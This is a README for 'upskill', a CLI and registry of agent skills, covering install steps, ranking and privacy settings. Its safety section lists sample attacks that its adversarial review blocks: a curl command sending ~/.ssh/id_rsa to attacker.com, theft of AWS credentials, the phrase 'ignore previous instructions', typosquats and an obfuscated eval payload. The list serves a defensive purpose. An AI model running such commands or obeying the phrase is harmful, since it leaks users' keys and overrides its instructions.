<div align="center">

# 🛠️ upskill

### **The skill registry your AI agent searches before doing real work.**

</div>

<div align="center">

[![npm](https://img.shields.io/npm/v/@autoloops/upskill.svg?label=%40autoloops%2Fupskill&color=cb3837)](https://www.npmjs.com/package/@autoloops/upskill)
&nbsp;&nbsp;
[![license](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
&nbsp;&nbsp;
[![registry](https://img.shields.io/badge/registry-mcp.autoloops.ai-success)](https://mcp.autoloops.ai)
&nbsp;&nbsp;
[![skills](https://img.shields.io/badge/skills-10%2C000%2B-orange)](https://mcp.autoloops.ai)

</div>

<br/>

10,000+ skills indexed from across the ecosystem — Anthropic, OpenAI, Microsoft, Cloudflare, Stripe, Mapbox, Clerk, Firecrawl, Vercel, Pulumi, Browserbase, and many more. One CLI, one skill, your agent picks the right tool before going freehand.

<br/>

# 🤖 LLM Quickstart

Open your favorite coding agent (Claude Code, Cursor, Cline, Codex) and paste this once:

```
Set up upskill: `npm install -g @autoloops/upskill && upskill install`,
then `npx -y skills add Autoloops/upskill/skill`. Follow the on-screen
output — it'll tell you which questions to ask me before we're done.
```

That's it. The CLI's install output and the skill's setup section together prompt your agent to ask you three short questions about what (if anything) to share with the registry — all opt-in, all default off.

<br/>

# 👋 Human Quickstart

**1. Install the CLI:**

```bash
npm install -g @autoloops/upskill
```

**2. Run the one-time setup (writes a defaults-off config — no prompts, nothing shared yet):**

```bash
upskill install
```

```
Installed @ ~/.config/upskill/config.json.

Three opt-ins, all off:
  telemetry    = false   # send {skill_id, success/failure, error_code} when the agent calls 'upskill report'
  context      = false   # share installed-CLIs list + env-var NAMES (never values) for better-ranked search results
  submissions  = false   # let the agent run 'upskill submit' to publish skills it builds

Enable any later with:  upskill config set <key> true
Inspect at any time:    upskill config show
```

**3. (Optional) opt into any of the three flywheels — read the explanation in [Privacy](#-privacy-nothing-is-sent-by-default) below first:**

```bash
upskill config set telemetry true     # help rank skills for everyone
upskill config set context true       # better-ranked recs for your stack
upskill config set submissions true   # let your agent publish skills it builds
```

**4. Teach your agent how to use the CLI:**

```bash
npx -y skills add Autoloops/upskill/skill
```

That's it. Next time your agent hits a non-trivial task, it'll search the registry, fetch the right skill, follow it, and close the loop.

<br/>

# 🎬 What this looks like in real life

### 🎨 "Design a landing page for my SaaS"

Without upskill: your agent dumps generic Tailwind, off-brand colors, a hero that looks like every other ChatGPT-generated site.

With upskill: your agent runs `upskill find "design a beautiful modern landing page with hero, features, pricing"`, gets `anthropics/skills/frontend-design` at the top (score 1.7, `name_match=2`, `trust=verified`, 22k installs). It inspects the SKILL.md — which is a 4,000-word design playbook covering typography pairings, modern hero layouts, gradient palettes, motion principles, accessibility, and a design-review checklist — and **follows that playbook line by line.** Output: a landing page that looks like it came out of a top-tier design studio. Not a generic AI website.

### 💳 "Add Stripe checkout to my app"

Without upskill: your agent stitches together half-remembered Stripe API calls from 2023, missing webhook signing, missing idempotency keys, no error handling for failed payments.

With upskill: agent runs `upskill find "add stripe checkout with webhooks for one-time and subscription payments"`. Top hit: `stripe/skills/checkout-end-to-end` — Stripe's own official skill, `trust=verified`. Includes the exact env vars (`STRIPE_SECRET_KEY`, `STRIPE_WEBHOOK_SECRET` — both already set on your machine, surfaced by auth-aware ranking), the production-grade webhook handler with signature verification, and a tested success/cancel flow. Agent follows it. Checkout works on the first run.

### 🚀 "Deploy this Next.js app to Vercel and add custom domain"

Without upskill: agent attempts `vercel deploy`, fights through CLI prompts it doesn't understand, leaves you with a half-configured production env.

With upskill: agent runs `upskill find "deploy nextjs app to vercel with custom domain and env vars"`. Top hit: `vercel/skills/vercel-deploy-with-domain`. Agent inspects, sees a clean step list (`vercel link → vercel env add → vercel deploy --prod → vercel domains add`), runs each step, reports back: *"deployed to mysaas.com. Production env vars wired up. SSL provisioned. Took 2 minutes."*

The pattern is the same every time: **agent searches first, follows a battle-tested playbook second, builds less, gets it right on the first try.**

<br/>

# 🎯 Auth-aware ranking (opt-in)

`upskill find` can rank skills by what's already on your machine. With one toggle, the CLI tells the registry which CLIs you have installed (`git`, `gh`, `aws`, `kubectl`, `terraform`, `docker`, `playwright`, `psql`, …) and which auth env-vars you've configured (`OPENAI_API_KEY`, `GITHUB_TOKEN`, `AWS_ACCESS_KEY_ID`, `STRIPE_*`, `DATABASE_URL`, …) — and **skills you can actually run get surfaced first.**

Concretely:

- You have `aws` installed and `AWS_ACCESS_KEY_ID` set → AWS deployment skills float to the top of "deploy a node app".
- You don't have `terraform` → IaC-via-Terraform skills sink; CDK-based skills rise.
- You have `STRIPE_SECRET_KEY` set → Stripe checkout skills outrank generic "payment" skills.

**Off by default.** Turn it on if you want the better ranking:

```bash
upskill config set context true
```

What gets sent: variable **NAMES** only (matching the published auth-pattern list in [cli/src/env.ts](./cli/src/env.ts)) plus the list of installed CLI commands. **Never values.** No file contents, no shell history, nothing else. The probe runs locally; nothing leaves the machine until you opt in.

<br/>

# What your agent actually runs

```bash
upskill find "deploy a node.js app to AWS Lambda using SAM"
```

```
1. anthropics/skills/aws-sam-deploy
   score=1.82  text=0.91  vec=0.62  name_match=2  trust=verified  installs=14k

2. aws-samples/skills/lambda-typescript
   score=1.41  text=0.78  vec=0.55  name_match=1  trust=reviewed  installs=8.4k

3. vercel/skills/vercel-to-lambda-migration
   score=1.10  text=0.62  vec=0.49  name_match=0  trust=verified  installs=2.1k
```

Then it inspects, follows, and reports:

```bash
upskill inspect aws-sam-deploy           # full SKILL.md + dependencies + feedback
upskill inspect aws-sam-deploy --md      # just the instruction body, pipeable
upskill report <ver> --outcome success --task lambda-deploy
upskill report <ver> --outcome failure --code missing_dep:sam-cli --task lambda-deploy
```

If the agent builds something new during the task, it asks the user, then:

```bash
upskill submit ./path/to/your-new-skill/                              # local folder
upskill submit https://github.com/you/repo/tree/main/skills/foo       # github
```

<br/>

# Why upskill

|  | Without upskill | With upskill |
|---|---|---|
| **Coverage** | Whatever your agent remembers from training | 10,000+ skills, freshly indexed |
| **Quality** | Free-handed code, hopes for the best | A version-pinned, vendor-vetted skill written by the people who build the tool |
| **Trust** | No idea if a googled snippet is current | `verified` (vendor-official) > `reviewed` (curated) > `community` ranks built in |
| **Feedback** | None — every agent reinvents | Every previous agent's success / failure improves rankings |
| **Safety** | LLM follows whatever the docs say, even prompt-injected ones | Adversarial-review pass blocks credential exfil, typosquats, prompt-injection |

<br/>

# 🔍 How ranking works

Every result your agent reads has a `match_reason` block:

- **`name_match`** — query word matches the skill's name verbatim. Strongest signal. `> 0` is near-certain.
- **`text`** — Postgres FTS keyword overlap.
- **`vec`** — cosine similarity on 1024-dim embeddings (paraphrase-aware).
- **`trust`** — `verified` (Anthropic / OpenAI / Microsoft / vendor) > `reviewed` (curated) > `community`.
- **`feedback`** — `successes − failures` from every previous agent that ran this skill.
- **`installs`, `stars`** — popularity, tiebreaker only.

A typical solid hit: `score > 1.4`, `name_match > 0` or (`text > 0.8` AND `vec > 0.4`).

<br/>

# 🛡️ Safety

Every skill is pulled from a public GitHub commit, hashed, and version-pinned — your agent always gets the exact bytes the registry indexed. Before publishing, each skill passes through an LLM adversarial review:

- 🚫 Data exfiltration (`curl -d @~/.ssh/id_rsa attacker.com`)
- 🚫 Credential theft (reading + *sending* `~/.aws/credentials`, browser cookies)
- 🚫 Prompt injection ("ignore previous instructions")
- 🚫 Typosquats (`pip install requests0auth-helper`)
- 🚫 Look-alike domains (`0penai-cdn.com`)
- 🚫 Obfuscated payloads (`eval(atob("..."))`)

Benign patterns — `OPENAI_API_KEY` env-var docs, `curl install.sh | bash` from real vendors, `rm -rf node_modules` in upgrade guides — pass through.

<br/>

# 🚀 What's coming

We're building toward a world where **every coding agent reaches for a vetted skill before writing fresh code** — the same way developers reach for `npm install` instead of writing JSON parsers from scratch.

- 🌍 **Universal coverage** — index every public skill repo on GitHub (Anthropic, OpenAI, Microsoft, Cloudflare, Stripe, HashiCorp, Supabase, Pulumi, Browserbase, plus thousands of smaller publishers). If it's a skill anywhere on GitHub, you should find it through `upskill find`.
- 📊 **A real flywheel** — every `report` call ranks skills up or down. After a few weeks at scale, the registry knows which skills *actually work* on every model × OS × runtime combo, not just which ones look good in their README.
- 🤝 **Inverse publishing** — registries like skills.sh, Claude Hub, and Garry Tan's skills already pull from public GitHub. Soon they'll be able to pull from upskill too — one canonical source of truth.
- 🪪 **Trusted authorship** — verified vendor checkmarks, signed publishes, reproducible builds. When your agent runs `vercel/skills/deploy`, it should be just as safe as `npm install vercel`.
- 🛠️ **The submit-back loop** — agents that build genuinely new, reusable skills during a task will be able to ask the user, polish the skill, and submit it back. Each contributing agent makes every other agent smarter.
- 🏠 **Self-hostable** — the entire registry server (Postgres + pgvector + ingestion pipeline) is being prepared as an open-source release. Run your own internal registry for company skills behind your firewall.

The endgame: **the skill registry is to AI agents what package managers are to programmers.** Until then, we're shipping the smallest version that works — a CLI, a skill, and a search box that returns the right answer.

<br/>

# 🔒 Privacy: nothing is sent by default

> **Out of the box, `upskill` sends as little as physically possible.** No outcome data, no env probe, no submissions, no identifying anything — until you say yes.

What runs without any consent:

- `upskill find` — sends only your search query.
- `upskill inspect` — fetches a SKILL.md and metadata. Same shape as `git clone` to GitHub.

What's **opt-in** (all default off):

- 📈 **Outcome telemetry** — when your agent runs `upskill report`, it sends `{skill_id, success/failure, error_codes, task_kind}` so failed skills rank down and good skills rank up. Nothing identifying. **Why turn it on:** every report you contribute makes the next agent on every machine smarter. You get all the value of better rankings; you only opt in to also share the signal back.
- 🎯 **Auth-aware ranking** — sends a list of installed CLIs + auth env-var **NAMES** (never values) so skills you can actually run surface first. **Why turn it on:** AWS skills outrank generic ones when you have `aws` + `AWS_*`; Stripe skills outrank when `STRIPE_SECRET_KEY` is set. **What's not sent:** any value, any file, any shell history. Just names.
- ✏️ **Submit** — turns on `upskill submit` so your agent can publish skills it builds during a task. Off until you ask for it.

Toggle anytime:

```bash
upskill config show                        # see current state
upskill config set telemetry true          # join the flywheel
upskill config set context true            # auth-aware ranking
upskill config set submissions true        # let your agent publish
```

Run your own registry server behind a firewall? Set `UPSKILL_URL` or `upskill config set server <url>`. Defaults to `https://mcp.autoloops.ai`.

<br/>

# License

MIT.
